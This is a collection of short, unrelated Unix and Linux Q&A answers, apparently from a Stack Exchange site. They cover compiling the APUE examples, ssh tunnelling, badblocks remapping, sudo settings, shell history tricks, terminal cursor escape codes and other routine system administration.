a short review of how to write and compile the programs in advanced programming in the unix® environment , thanks to slm for helping me understand the steps . you can download the source code from here . i wish this information was included as part of appendix b of the book , where the header file is explained . the uncompressed file contains directories with the names of the chapters and two others named include and lib . the ones with the names of the chapters have all the programs of that chapter in them . the include directory contains the header file that is used in most of the programs in the book : apue.h . the lib directory has the source code of the implementations for the that header . lets assume the uncompressed file is located at : SCADDRESS/ , for example it might be : /home/yourid/Downloads/apue.3e/ once you uncompress the source code , go in the directory and run make: $ cd SCADDRESS $ make  make will compile all the programs in all the chapters . but the important thing is that before that , it will make the library that will contain the implementations of the functions in apue.h . to compile an example program that you write from the book , run this gcc command ( assuming your program 's name is myls.c which is the first in the book ) : gcc -o myls myls.c -I SCADDRESS/include/ -L SCADDRESS/lib/ -lapue  -I tells gcc which directory to look for the include file . -L tells it the location of the library directory , and -lapue , tells the name of the library file to look for in that directory . such that -lxxx means to look for a file in the library directory with the name : libxxx . a or libxxx . so .
add this to your .bash_login file . alias tar=tar --backup=simple this will append a ~ to the file it is about to overwrite . so when you create the archive it will always run tar --backup=simple zcvf foo.tex foo.bib  and after execution a foo . tex~ will exist ( this is the actual tex file and the archive will be in at foo . tex )
the best/simplest solution is to change your program to save the state to a file an reuse that file to restore the process . based upon the wikipedia page about application snapshots there are multiple alternatives : there is also cryopid but it seems to be unmaintained . linux checkpoint/restart seems to be a good choice but your kernel needs to have CONFIG_CHECKPOINT_RESTORE enabled . criu is probably the most up to-date project and probably your best shot but depends also on some specific kernel options which your distribution probably has not set . this is already too late but another more hands-on approach is to start your process in a dedicated vm and just suspend and restore the whole virtual machine . depending on your hypervisor you can also move the machine between different hosts . for the future think about where you run your long-running processes , how to parallize them and how to handle problems , e.g. full disks , process gets killed etc .
you do not need to use awk at all . use the built-in tests that ksh provides , something like this : that little script looks in all the directories in the current directory , and tells you if they only contain files , no sub-directories .
in your putty config , the traffic is exiting the tunnel at ssh . inf . uk and being forwarded directly to markinch . inf . uk . so you are only building 1 tunnel . in your ssh statements , you are building 2 tunnels - one from localhost to ssh . inf . uk , and a second from ssh . inf . uk to markinch . inf . uk . i have not yet worked out why the 2-tunnel solution is not working for you . however , you might try adjusting your ssh command to match what putty 's doing and see if that works .  ssh -L localhost:5910:markinch.inf.uk vass@ssh.inf.uk 
what you are looking for is typically called kiosk mode . kiosk from scratch there is a good tutorial over on alandmore 's blog titled : creating a kiosk with linux and x11: 2011 edition . view this is only a start . livecd additionally i would consider using a livecd for this type of situation since this will limit any permanent damage one can inflict if they were to game the system . ppl kiosk there used to be a project titled : ppl kiosk - kiosk livecd for princeton public library . the project appears to be dead but there is a link to a script : kioskscript . sh which will take a ubuntu system and setup a kiosk mode within it . kiosk in 10 easy steps this tutorial titled : ubuntu 12.04 kiosk in 10 easy steps , does not do any hardening of the system but does show how you can configure ubuntu to only open a web browser after booting up . going beyond the above is by no means exhaustive , but should give you a start . i would spend some additional time googling for " linux kiosk livecd " for additional tips and tricks .
you can find out which module a device is using through these 2 methods . note : alias interfaces are also called virtual interfaces . in researching this i do not believe there is an actual kernel module that facilitates virtual interfaces on physical ones , rather it is a function that physical drivers provide . using the /sys filesystem if you note which device you are using that has an alias network interface . notice the last line , that is my virtual interface , eth1:0 . now to find out which kernel module is facilitating it . taking a look at the /sys file system for this device . the path will be the base device that has the alias attached to it , eth1 in our example . so if we ls -l follow those paths we will ultimately get the following driver that is being used by the device . so we are using the natsemi driver . $ lsmod | grep natsemi natsemi 32673 0  lshw another method for finding the driver is to use the tool lshw and query the network devices . example the key lines in this output are these : if you look at the configuration: line you will notice the driver=natsemi . this is that same kernel module . so then where 's /proc/net/ip_alias ? this is an older facility in the linux &lt ; 2.2 kernels that was removed/depreated in the move to 2.4+ kernels . see the ip-aliases howto for example . excerpt ip alias is standard in kernels 2.0 . x and 2.2 . x , and available as a compile-time option in 2.4 . x ( ip alias has been deprecated in 2.4 . x and replaced by a more powerful firewalling mechanism . )
you can establish a tunnel with ssh to make it appear that pycassashell is connecting from the server running cassandra . on the remote host , establish a ssh tunnel with this - ssh -N -L 9160:127.0.0.1:9160 10.11.12.13 then on the remote host , run pycassaShell --host 127.0.0.1 --port 9160 alternatively , you could setup ccm to listen on a non-localhost port .
some classic ascii invisible whitespace characters are : tab : \t new line : \\n carriage return : \r form feed : \f vertical tab : \v all of these are treated as characters by the computer and displayed as whitespace to a human . other invisible characters include audible bell : \a backspace : \b as well as the long list in the wikipedia article given by frostschutz .
[ the archwiki looks dead currently , so i do not know what is contained in the instructions you linked to . ] to change the looks of lightdm , you need to install a theme and configure it . this page suggests that the relevant arch packages might be lightdm-unity-greeter or lightdm-webkit-greeter .
well , there are a couple of cases : this disk is part of a raid array . good . just have md ' repair ' the array like this : echo 'repair' &gt; /sys/block/md0/md/sync_action . problem solved without data loss . ( i am guessing this is not the case for you , but you really ought to consider changing that . ) you do not care about the data on the disk ( or there is not any ) . just use dd to zero the whole disk . the bad blocks are part of the free space on the disk . use e.g. , cat /dev/zero &gt; tempfile to fill the free space with zeros . do this as root ( there is space reserved for root only ) , probably in single-user mode ( so nothing breaks from running out of space ) . after that runs out of space , remove the file . the bad blocks are part of the data ( files ) or metadata ( filesystem structure ) on the disk . you have lost data . fsck -fc ( run with the filesystem unmounted , or worst case in readonly during early boot if its the root filesystem ) will tell you which files . replace them from backup . its also possible that badblocks -n , which must only be done on an unmounted filesystem , will force a remap . it should not lose any data ( other than what was in the bad blocks , which is already lost ) . if you want to script it based on the badblocks output ( which is not safe , it leaves you with silent corruption ) , that is fairly easy . each line of badblocks output gives you a block number , based on your block size ( 512 in your example ) . use the same block size for dd 's bs . the block number is your seek for dd . your count is 1 ( or higher , if there are a few bad blocks in a row ) . of is the partition ( or disk ) you ran badblocks on . a good if is /dev/zero .
you could do something like : the idea being that before each prompt , we check the last history entry ( history 1 ) and if it is one of the dangerous ones , we delete it ( history -d ) and add it back with a # with history -s . ( obviously , you need to remove your HISTIGNORE setting ) . an unwanted side effect of that though is that it alters the history time of those rm , mv . . . commands . to fix that , an alternative could be : this time , we record the time of the last history , and to add back the history line , we use history -r from a temporary file ( the here document ) that includes the timestamp . you had want the fixhist to be performed before your history -a; history -c; history -r . unfortunately , the current version of bash has a bug in that history -a does not save that extra line that we have added . a work around is to write it instead : that is to append the commented command to the histfile ourselves instead of letting history -a do it .
to find a space , you have to use [:space:] inside another pair of brackets , which will look like [[:space:]] . you probably meant to express grep -E '^[[:space:]]*h' to explain why your current one fails : as it stands , [:space:]*h includes a character class looking for any of the characters : : , s , p , a , c , and e which occur any number of times ( including 0 ) , followed by h . this matches your string just fine , but if you run grep -o , you will find that you have only matched the h , not the space . if you add a carat to the beginning , either one of those letters or h must be at the beginning of the string to match , but none are , so it does not match .
you can run selenium on a headless installation on your server , e.g. by programming the actions in python using pyvirtualdisplay . pyvirtualdisplay allows you to use a xvfb , xepher or xvnc screen so you can do screenshot ( or take a remote peek to see what is going on ) . on ubuntu 12.04 install : sudo apt-get install python-pip tightvncserver xtightvncviewer sudo pip install selenium pyvirtualdisplay  and run the following ( this is using the newer selenium2 api , the older api is still available as well ) : the xmessage prevents the browser to quit , in testing environments you would not want this . you can also call browse_it() directly to test in the foreground . the results of selenium 's find_element.....() do not provide things like selecting the parent element of an element you just found . something that you might expect from html parsing packages ( i read somewhere this is on purpose ) . these limitations can be kind of hassle if you do scraping of pages you have no control over . when testing your own site , just make sure you generate all of the elements that you want to test with an id or unique class so they can be selected without hassle .
you could use a variable and read it from within the makefile . example : git: git commit -m "$m"  then you can commit with : make git m="My comment" .
try changing the pager that git uses : GIT_PAGER="cat" git submodule foreach 'git grep x'  or if you want less to be used , but only when output will run off of the screen : GIT_PAGER="less -FX" git submodule foreach 'git grep x'  you can set the pager per project by using git config , or you can , of course , set the environment variables globally .
$ ddate Today is Prickle-Prickle, the 41st day of Discord in the YOLD 3179 
i was having the same problem some years ago due to a gui widget that was looking for system updates and which was locking the package manager . you can maybe verify running gui applications ( including widget , systray ) to be sure that no one related to package management is opened .
the device 's sample rate is by default what the application has configured for it , i.e. , the sample rate of the original file .
for security reasons , sudo may clear environment variables which is why it is probably not picking up $java_home . look in your /etc/sudoers file for env_reset . from man sudoers: so , if you want it to keep java_home , add it to env_keep : Defaults env_keep += "JAVA_HOME"  alternatively , set JAVA_HOME in root 's ~/.bash_profile .
i think you can prevent this by passing a WINCH signal to dtach: dtach -c /tmp/my-dtach-session-pipe -r winch vim  or at reattachment : dtach -a /tmp/my-dtach-session-pipe -r winch 
you can use the -w switch to man to see where man pages are being loaded from on disk . example $ man -w lsof /usr/share/man/man8/lsof.8.gz  so you could locate man pages for software that is similar to this and add the man page you want locally on the system to this same directory . i did also dig this up , titled : chef gem man pages , which shows man pages being installed via gem instead for chef . this looks like a better approach to me if i understand what you want .
disable the drive cache and try re-formatting again . the system is getting ahead of the hardware .
it will not affect the kernel itself ( besides not taking advantage of the update ) . however , some newly installed programs might rely on newer kernel features . also , if you run a program that relies on loading a kernel module then you may find that that module is no longer installed , and newly installed modules will not load in the old kernel . basically , if there is a problem , you will see it . otherwise you are fine .
try starting libvirtd . $ service libvirtd restart  you can check if it is running like this : $ pgrep libvirtd 1124  that number is the process id of libvirtd . $ ps -eaf|grep [l]ibvirtd root 1124 1 0 Mar17 ? 00:00:02 /usr/sbin/libvirtd 
the error codes are not from make : make is reporting the return status of the command that failed . you need to look at the documentation of each command to know what each status value means . most commands do not bother with distinctions other than 0 = success , anything else = failure . in each of your examples , ./dpp cannot be executed . when this happens , the shell that tried to invoke it exits with status code 126 ( this is standard behavior ) . the instance of make that was running that shell detects a failed command ( the shell ) and exits , showing you Error 126 . that instance of make is itself a command executed by a parent instance of make , and the make utility returns 2 on error , so the parent make reports Error 2 . the failure of your build is likely to stem from test: too many arguments . this could be a syntax error in the makefile , or it could be due to relying on bash-specific features when you have a /bin/sh that is not bash . try running make SHELL=/bin/bash target or make SHELL=/bin/ksh target ; if that does not work , you need to fix your makefile .
from man zip: -b path --temp-path path  use the specified path for the temporary zip archive . for example : zip -b /tmp stuff *  will put the temporary zip archive in the directory /tmp , copying over stuff . zip to the current directory when done . this option is useful when updating an existing archive and the file system containing this old archive does not have enough space to hold both old and new archives at the same time . it may also be useful when streaming in some cases to avoid the need for data descriptors . note that using this option may require zip take additional time to copy the archive file when done to the destination file system . by default zip stores the full path relative to the current directory . if you want your zipfile to have your sql directory as the root , you will need to run the command from the /home/cyrus directory .
a change is any command that modifies the text in the current buffer . you will find all commands listed under :help change.txt . in insert mode , a change is further limited to a sequence of continually entered characters , i.e. if you use the cursor keys to navigate ( which you should not ) , only the last typed part is repeated . commands like j are motions ; i.e. they do not affect the text , and just move the cursor . those are not repeated . if you want to repeat multiple changes , or a combination of movements and changes , record the steps into a macro ( e . g . qaA;&lt;Esc&gt;jq ) , and then repeat that ( @a ) .
the 'spellfile' option is what you are looking for : :set spellfile=~/.vim/spell/techspeak.utf-8.add  note : avoid special characters like _ ; as it separates the region name in vim . you can then add your custom words to it with zg . you do not even need to add anything to 'spelllang' ; those additions will be considered automatically .
the following works in bash 4.2: list=( /&lt;root_path&gt;/&lt;process_two_path&gt;/logs/* ) echo "${list[-1]}"  if your bash is an older version : list=( /&lt;root_path&gt;/&lt;process_two_path&gt;/logs/* ) echo "${list[${#list[@]}-1]}" 
rsync --max-size=... --exclude '.*' edit 1: quoting from the man page : --max-size=size this tells rsync to avoid transferring any file that is larger than the specified size . the size value can be suffixed with a string to indicate a size multiplier , and may be a fractional value ( e . g . "--max-size=1.5m" ) . this option is a transfer rule , not an exclude , so it doesn’t affect the data that goes into the file-lists , and thus it doesn’t affect deletions . it just limits the files that the receiver requests to be transferred . the suffixes are as follows : " k " ( or " kib" ) is a kibibyte ( 1024 ) , " m " ( or " mib" ) is a mebibyte ( 1024*1024 ) , and " g " ( or " gib" ) is a gibibyte ( 1024*1024*1024 ) . if you want the multiplier to be 1000 instead of 1024 , use " kb " , " mb " , or " gb " . ( note : lower-case is also accepted for all values . ) finally , if the suffix ends in either "+1" or "-1" , the value will be offset by one byte in the indicated direction . examples : --max-size=1.5mb-1 is 1499999 bytes , and --max-size=2g+1 is 2147483649 bytes .
well , yep , it sure was something obvious as to why it was not working . when i had fixed the bug that i needed to add /bin/bash -c to allow the use of -i , i had not changed the full path for the command , /usr/bin/reprepro , to what i was actually passing in , reprepro . changing it to use the full path as below , or likewise changing the rule to only include the command , works fine . lambda@host:~$ sudo -K lambda@host:~$ sudo -u repomgr -i /usr/bin/reprepro -b /var/packages/devel pull  that still leaves the puzzle of why the NOPASSWD is not showing up in the sudo -l query , but i have solved the actual problem .
ok , so i guess your problem was that multiple-quote marks per line were pulling in more than you wanted because regex is inherently greedy - it will always match as much as possible if it can . so the solution is to ensure you only match between the two double-quote marks , like : grep -o 'CLASS_NAME:"[^"]*"' script.js 
after commenting out the offending lines ( CMakeLists.txt:9 , CMakeLists.txt:10 , be.clock/CMakeLists:22 ) it compiles just fine for me .
looks like your $path environment variable is screwed or has been reset . you will have to find out where it is being set ( or appended to ) . when you login , the system runs /etc/profile and then ~/ . bash_profile ( depending on your shell ) . make sure $path is set correctly then make sure that grep/tar/cat are actually in your path .
no . x is the only usable gui on linux . there have been competing projects in the past , but none that gained any traction . writing something like x is hard , and it takes a lot of extra work to get something usable in practice : you need hardware drivers , and you need applications . since existing applications speak x11 , you need either a translation layer ( so… have you written something new , or just a new x server ? ) or to write new applications from scratch . there is one ongoing project that aims to supplant x : wayland . however its aim is to give applications more direct access to advanced hardware features . if anything , that would reduce security , not enhance it . you can run a few graphical applications on linux without x with svgalib . however that does not bring any extra security either ( in addition to numerous other problems , such as poor hardware support , poor usability , and small number of applications ) . svgalib has had known security holes , and it does not get much attention , so it probably has many more . x implementations get a lot more attention , so you can at least mostly expect that the implementation matches the security model . x has a very easily understood security model : any application that is connected to the x server can do anything . ( that is a safe approximation , but a fairly realistic one . ) you can build a more secure system on top of this , simply by isolating untrusted applications : put them in their own virtual environment , displaying on their own x server , and show that x server 's display in a window . you will lose functionality from these applications , for example you have to run things like window managers and clipboard managers in the host environment . there is at least one usable project based on this approach : qubes .
this is easy since pdftk 1.44 which added the shuffle operation allowing different transformations on odd and even pages ( amongst other uses ) . if you have an older version of pdftk , you can use this python script with the pypdf library . ( warning , typed directly into the browser . )
you can not without writing a bit of code . those symlink shortcuts work because vim is written that way . it looks at how ( with what name ) it was started and acts as if it had been called with the appropriate command line options . this behavior is hardcoded in the executable , it is not a trick done by the symbolic link . so if you want to do that yourself , the easiest is to write a small wrapper script that execs vim with the options you want : #!/bin/sh exec vim &lt;options you want&gt; "$@"  the "$@" at the end simply passes any command line options given to the script along to vim .
you should check out monica - it is a handy gui frontend that let 's you calibrate your monitor . monica depends on fltk-devel afaik . read the wiki article on color management under linux . a little bonus ( and one of my favourite monitor tools ) is redshift which is the linux equivalent of f . lux . it sets the temperature of your monitor according to the position of the sun , so that your eyes will be more confortable staring at your screen at late hours .
tl ; dr : if you do not build it in yourself , it is not going to happen . the effective way to do this is to simply write a custom start script for your container specified by CMD in your Dockerfile . in this file , run an apt-get update &amp;&amp; apt-get upgrade -qqy before starting whatever you are running . you then have a couple way of ensuring updates get to the container : define a cron job in your host os to restart the container on a schedule , thus having it update and upgrade on a schedule . subscribe to security updates to the pieces of software , then on update of an affected package , restart the container . it is not the easiest thing to optimize and automate , but it is possible .
first of all , a gnu/linux distribution consists of many software packages , some of which are licensed under gnu gpl , but there are other licenses involved as well . for example , perl is covered under the artistic license or gpl — your choice , and apache is covered by the apache license . that said , the gpl is one of the strongest copyleft licenses that you will have to work with . the gnu gpl only covers distribution ; you do not even have to abide by its terms as long as you do not share your linux distribution with anyone . if you do share it , though , anyone who receives a copy has a right to demand that you provide the source code . alternatively , you could take an approach similar to red hat , which is to publish only the source code , but provide compiled binaries only to paying customers . if you want to build a closed-source product , though , gnu/linux is a poor base to start from . you could consider customize a system based on bsd instead .
if i understand correctly , you want playback on your build in sondcard and capture ( microphone ) from external usb device . your external device is listed as card 2: device 0 and your build in soundcard as card 0: device 0 i think your asound.conf should look something like this : pcm.!default { playback.pcm { type hw card 0 device 0 } playback.capture { type hw card 2 device 0 } } 
this might be an option : store the command and args in an array , then execute it after
no , you need something that reads its stdin and writes it to some file . cat is a good choice for that as it supports binary data and does not do anything fancy with its input so is small and efficient . you could do : ... | ssh remote 'cp /dev/stdin outputfile`  but that would not be more efficient and would only work on systems that have /dev/stdin .
deleting the default route should do this . you can show the routing table with /sbin/route , and delete the default with : sudo /sbin/route del default  that'll leave your system connected to the local net , but with no idea where to send packets destined for beyond . this probably simulates the " no external access " situation very accurately . you can put it back with route add ( remembering what your gateway is supposed to be ) , or by just restarting networking . i just tried on a system with networkmanager , and zapping the default worked fine , and i could restore it simply by clicking on the panel icon and re-choosing the local network . it is possible that nm might do this by itself on other events , so beware of that . another approach would be to use an iptables rule to block outbound traffic . but i think the routing approach is probably better .
all you can do is set targetpw as default , but this will not require root to enter any password . you can not configure sudo to do this and it would not make any sense , either , since root may always do whatever he wants ( su does not ask for a password either , does it‽ ) . so put Defaults targetpw  into your /etc/sudoers file and you should have su behavior .
you can not use W with t . i believe t alone is enough to test the archive .
/usr/local is usually for applications built from source . i.e. i install most of my packages using something like apt , but if i download a newer version of something or a piece of software not part of my distribution , i would build it from source and put everything into the `/usr/local ' hierarchy . this allows for separation from the rest of the distribution . if you are developing a piece of software for others , you should design it so that it can be installed anywhere people want , but it should default to the regular fhs specified system directories ( /etc , /usr/bin , etc . ) i.e. /usr/local is for your personal use , it should not be the only place to install your software . have a good read of the fhs , and use the standard linux tools to allow your source to be built and installed anywhere so that package builders for the various distributions can configure them as required for their distribution , and users can put it into /usr/local if they desire or the regular system directories if they wish .
ntfs-3g is fuse based , so it should be absolutely ok to disable the kernel module you are asking about . though , it is still unclear to me why one would want to do that .
you can do it this way using virsh along with some scripting : incidentally those same vms through an lsof command : it does not look like lsof shows which pty they are using , just that they are using the ptmx . see the ptmx man page for more info . references setting up a serial console in qemu and libvirt the left side are the names of the vms and the right side is the pts .
not a " bash-only " answer , but perhaps useful : echo "$PWD///" | tr -s '/' 
assuming history files are hidden ( beginning with . ) , i would do like : ls -1 ~/.*history  with output : execute : for hist_file in ~/.*history; do cp "$hist_file" "$hist_file$(date +%m%d%Y).txt"; done  and then : ls -1 ~/.*history*  with following output : i hope it can be useful for your question .
if you wonder about the home directory , it should not matter that much , because it will probably not change the behavior of apache at all . on debian , the default homedir for the user running apache is /var/www ( which is the default DocumentRoot ) . also , if you are on a debian-based distrib , you should prefer using adduser instead of useradd which is quite low level .
it is a known bug in fedora 17 . the /lib/udev/rules.d/71-seat.rules has a rule for a " mimo 720 " device ( an usb monitor with its own usb hub ) which uses the same chipset ( thus the same usb id ) for this task . however , because i am not using a mimo 720 , it gets misconfigured . solution is editing /lib/udev/rules.d/71-seat.rules and commenting the line SUBSYSTEM=="usb", ATTR{idVendor}=="058f", ATTR{idProduct}=="6254", ENV{ID_AUTOSEAT}="1"  then it works perfectly . in fact , checked on arch linux and it uses a different strategy to detect that device :
how does this perl script i just whipped up work ? use : perl timer.pl 1 date '+%Y-%m-%d %H:%M:%S' it has been running 45 minutes without a single skip , and i suspect it will continue to do so unless a ) system load becomes so high that fork ( ) takes more than a second or b ) a leap second is inserted . it cannot guarantee , however , that the command runs at exact second intervals , as there is some overhead , but i doubt it is much worse than an interrupt-based solution . i ran it for about an hour with date +%N ( nanoseconds , gnu extension ) and ran some statistics on it . the most lag it had was 1 155 microseconds . average ( arithmetic mean ) 216 µs , median 219 µs , standard deviation 42 µs . it ran faster than 270 µs 95% of the time . i do not think you can beat it except by a c program .
if you want to catch them all , there is no other choice but to do full filesystem traversals . ldconfig knows only about the libraries in the standard paths and the extra paths it is configured to look in ( usually defined in /etc/ld.so.conf* ) . the usual suspect places where other libraries can be found are $HOME and /opt , though there is no limit , especially when people build applications themselves . if you do not trust the output of ldconfig -p , you can parse its cache directly . it is binary , but using strings removes all the garbage ( 5 so /lib/ matches ) : strings -n5 /etc/ld.so.cache  on my system , they both give the same results , which i verified with this quicky : which checked if any library on the ldconfig -p list was not mentioned in the cache . nothing was returned .
this message comes from reset itself , have a look at the source or to be more precise the report function . please be aware that the official homepage is http://invisible-island.net/ncurses/ and not the linked repository .
it seems that you want to install the files to the same place where you extracted the tarball . extract the tarball to a different place or try a different prefix and it should work ( worse option : use make install -i to ignore all error messages ) .
linux stores time internally , regardless of your hardware clock ( a . k.a. rtc ) . that means your system can show one time when you run date ( linux clock ) , and a different time when you run hwclock ( hardware clock ) . usually , you would want to load the time from the hardware to linux when the machine boots ( with hwclock -hctosys ) , and when the machine goes down , you want to store your pretty accurate time ( you do use ntpd , do not you ? ; ) ) - back to the hardware clock , with hwclock -systohc . now , what happens if your system dies , reboots abnormally , etc ? the clock does not get synchronized to hardware . on next boot , you might have a large clock skew , because the hardware clock is not that accurate . . . next time you will say " i need my system to start with ntpdate before ntpd , because otherwise , ntpd might not sync the time at all , because the delta on the current clock and the real time is too big " . the problem with that approach is . . . what happens if you happen to sync to a machine which by itself is not in sync , and then your ntp will never have the right time ? so in order to avoid all that , it is good to keep the right time synchronized to the hardware at all times . what the kernel option you are asking about seems to do , is to note if your time is actually synchronized with ntp ( there is a way to know that . . . ) - and if it is - sync that time regularly from linux time ( a . k.a. system time ) , to the hardware clock , so it will be very accurate at all times , including sudden system crashes .
some unix partitioner , are deperecated and GPT partition table is new and some tools does not work GPT . GNU parted is new and gparted is GNOME Parted for example : note : gpt is abbrivation of GUID Partition Table and much new . gpt
q#1: make the cpu/memory at the top only count those pids . is this possible ? unfortunately no top and htop do not provide a mechanism for only showing the individualized load in the upper portion of their output . however the cpu/memory resources are displayed per process as 2 of the columns of output for each pid . enter ' tree ' mode on startup , or you can configure htop so that these are the defaults . if you toggle tree view so that it is enabled and then exit htop using q or f10 when you re-launch it the tree view should persist , it is now the default . change columns displayed ? the same applies to the columns . select the ones you want and they will become the defaults as well . note : htop maintains its setting in this config file : ~/.config/htop/htoprc . example you could manipulate this file , htop makes no provisions for loading alternate files , so you had have to beware of changing the file . you could also maintain your own file on the side , and then link to it prior to launching htop .
the cursor is drawn by the terminal or terminal emulator , not the applications running within them . some of them have provision to allow the user to change the shape or attributes of the cursor using escape sequences . changing the cursor shape independently from the type of the terminal can be done using the cnorm ( normal cursor ) , civis ( cursor invisible ) , or cvvis ( cursor very visible ) terminfo capabilities ( for instance using the tput command ) . however , it does not give you any warranty that any of cnorm or cvvis will be a block cursor . to affect the blinkiness , shape and colour and behaviour of the cursor specifically , that will have to be done on a per-terminal basis . on linux on x86 pcs vga and frame buffer virtual consoles , it can be controlled using escape sequences like : printf '\e [ ? x ; y ; z c ' in the simplest form : printf '\e [ ? x c ' you define the height of the cursor where x ranges from 1 ( invisible cursor ) to 8 ( full block ) , 0 giving you the default ( currently , same as 2 ) . so : printf '\e[?8c'  will give you a full block cursor . actually that is what tput cvvis sends ( while tput cnorm sends \e[0c and civis \e[1c ) . when using the 3 parameter form , the behaviour will vary with the underlying video driver . for instance to get a sort of grey non-blinking block cursor as your question suggests , you had do : printf '\e[?81;128;240c'  in a pc vga linux console . and : printf '\e[?17;30;254c'  in a frame buffer linux console . now , that was linux specific , other terminals have different ways to change the cursor shape . for instance xterm and rxvt and their derivatives use the same sequences as the vt520 terminal to set the cursor shape : printf '\e [ x q ' where x takes a value from 1 to 4 for blinking block , steady block , blinking underline , steady underline . and the colour can be set with : printf '\e ] 12 ; %s\a ' ' colour ' so your grey steady block cursor could be achieved there with : printf '\e[2 q\e]12;grey\a'  for most x11 terminal emulators , you can also change the cursor attributes via command-line options to the command that starts the emulator or via config files or x11 resources , or menus . for instance , for xterm , you have the -uc/+uc option for underline cursor , -ms for its colour , and cursorBlink , cursorColor , cursorOffTime , cursorOnTime , cursorUnderLine , alwaysHighlight resources to configure it . and the default menu on ctrl + left click has an option to turn blinking on or off .
for commands that do not have an option similar to --color=always , you can do , e.g. with your example : script -c "ffmpeg -v debug ..." /dev/null &lt; /dev/null |&amp; less -R  what script does is that it runs the command in a terminal session . edit : instead of a command string , if you want to be able to provide an array , then the following zsh wrapper script seems to work : #!/usr/bin/env zsh script -c "${${@:q}}" /dev/null &lt; /dev/null |&amp; less -R 
i would prefer to setup a vpn ( openvpn for example ) with server on your machine and client on your friend 's machine . when he wants you to connect , he opens the vpn ( no login involved on your machine ) and you open your remote desktop client to his machine 's ip ( at least with openvpn , you can assign a " fixed " ip to his machine so you can save it , not needing to look at it everytime ) . this way you have no login to your machine and you only access his machine when he opens the vpn . on the other side , you can shutdown the server when you do not want him to connect to your machine . anyways , if you do not give him a user on your machine ( or a user with only the access you want ) , he will not be able to to much there . and this way , you can do it with more friends easily if needed as they only need to install the vpn client .
imho , there is no such ctrl+alt+del key-combination for linux . but to check , why the machine get hangs , you can do either : press alt+ctrl+f1 , and observe the command " top " , to see " who"/"which program " is eating up the cpu and causing the hang . you can place " system-monitor " in the taskbar , whose indicator will show the cpu-usage , for observation .
you can first remove all unneeded locales by doing : $localedef --list-archive | grep -v -i ^en | xargs localedef --delete-from-archive  where ^en can be replaced by the locale you wish to keep then $build-locale-archive  if this gives you an error similar to $build-locale-archive /usr/sbin/build-locale-archive: cannot read archive header  then try this $mv /usr/lib/locale/locale-archive /usr/lib/locale/locale-archive.tmpl $build-locale-archive 
most of the time you will use ssh . vncviewer might be available , but often it is not ( most servers will not have x11 or anything graphics-related ) . why use ssh ? from the centos documentation : after an initial connection , the client can verify that it is connecting to the same server it had connected to previously . the client transmits its authentication information to the server using strong , 128-bit encryption . all data sent and received during a session is transferred using 128-bit encryption , making intercepted transmissions extremely difficult to decrypt and read . the client can forward x11 applications from the server . this technique , called x11 forwarding , provides a secure means to use graphical applications over a network .
" . . . but it is not going to be installed " generally means that a serious dependency conflict will ensue if it is allowed to go on . try the following command : aptitude why-not citadel-mta  why-not basically checks dependencies and returns the reasons it would have to not fill a particular dependency automatically . in the case of my system at home : apparently citadel-mta is a full-on mta and will therefore replace whatever mail-transport-agent package you currently have installed . explicitly telling it to install citadel-mta as well should be enough to break the deadlock . note : doing so means your current mail server software will be replaced by the one that comes with citadel . make very sure that that is what you want before you do this .
m-x grep in emacs , then i can use the usual keys for following the links representing the found matches , and also the usual general-purpose emacs keys for switching between buffers back and forth ( or for whatever i want ) . one can also learn the specialized keys for jumping to the next match . the " specialized " key to jump immediately to the next found match is quite easy to remember : it is m-g n ( g o to n ext ) ( or c-x ` ) for next-error . next-error is a command that is more general-purpose than just for grep ; from the help ( per c-h k m-g n ) : [ it ] normally uses the most recently started compilation , grep , or occur buffer . ( indeed , first i learned it for latex " compilation " . ) more of the general " go to " commands bound to keys in my emacs ( as per m-g c-h ) : global bindings starting with m-g : key binding --- ------- m-g esc prefix command m-g g goto-line m-g n next-error m-g p previous-error m-g m-g goto-line m-g m-n next-error m-g m-p previous-error
if the script properly begins with #!/bin/bash ( you can not have another comment before that ) , you should simply execute it by typing /path/to/script.sh , without that . at the beginning . the . is an include statement , it means “execute the contents of this file as if it had been typed here on the command line” ( this is called “sourcing” in unix shell jargon ) . running bash and sourcing the script should work . i am guessing that because you had bash automatically started in some circumstances , but you prefer zsh , you have set up bash to automatically switch over to zsh — maybe with exec zsh in your ~/.bashrc . do not do that : instead you should switch over to zsh in the file that is executed when you log in , i.e. ~/.profile , and leave .bashrc alone . to have zsh be executed in terminals , set the SHELL environment variable : # in ~/.profile export SHELL=/bin/zsh if [ -t 1 ]; then exec $SHELL; fi  it is unfortunate that you can not modify the script , because it is buggy . the brackets should be quoted , even in bash . if there is a file called 3+ in the current directory , the call to egrep will search for one or more occurrences of the digit 3 instead of a sequence of arbitrary digits . if there is a file called 3+ and a file called 4+ , the call to egrep will search for 3s in the file 4+ . here , the difference between bash and zsh only comes into play when no file matches the supplied pattern : bash silently runs the command with the unsubstituted pattern , whereas zsh signals an error ( by default ) .
according to the developer 1 , this is not currently possible in tmux . [ 1 ] http://sourceforge.net/mailarchive/message.php?msg_id=27427973
in the shell command line , unquoted spaces only serve to delimit words during command parsing . they are not passed on , neither in the arguments the command sees nor in the standard input stream .
you can use bash process substitution : while IFS= read -r line do ./research.sh "$line" &amp; done &lt; &lt;(./preprocess.sh)  some advantages of process substitution : no need to save temporary files . better performance . reading from another process often faster than writing to disk , then read back in . save time to computation since when it is performed simultaneously with parameter and variable expansion , command substitution , and arithmetic expansion
there are a few options : tr : \\\n sed 's/:/\\n/g' awk '{ gsub(":", "\\n") } 1' you can also do this in pure bash: while IFS=: read -ra line; do printf '%s\\n' "${line[@]}" done 
there is a process group leader - sort of like the head process - that owns the terminal , /dev/tty . a process group can be one or many processes . the stty command changes and displays terminal settings . if you are actually going to use unix seriously consider finding a copy of stevens ' advanced programming in the unix environment ' . terminals have a lot of heavy baggage from the 1970 's . you will spot that right away . most of those odd settings can be ignored except for special things like unix system consoles .
if you want a generic way to do that , that involves a single command or function , sorry this is not it . assuming you know the location of the of the covers , for example ~/.xmms2/clients/generic/art/ you just need the name of the file corresponding with a particular album and artist . according to the wiki the name of the image file is calculated using the md5 checksum of the "$artist-$album" all in lowercase , resulting in something like 186bdc073dcbab197caa9000e441a740-thumbnail.jpg for the album " some album " from artist " some artist " . you can calculate this with a few shell commands . COVER=$(echo "Some Artist-Some Album" | tr [A-Z] [a-z] | md5sum) COVER="${COVER% -*}-thumbnail.jpg"  you can replace "Some Artist-Some Album" with "$artist-$album" given the values you need are actually stored on those variables . using ${COVER% -*} because md5sum adds a " -" at the end of the generated string , maybe there is a better way to fix that .
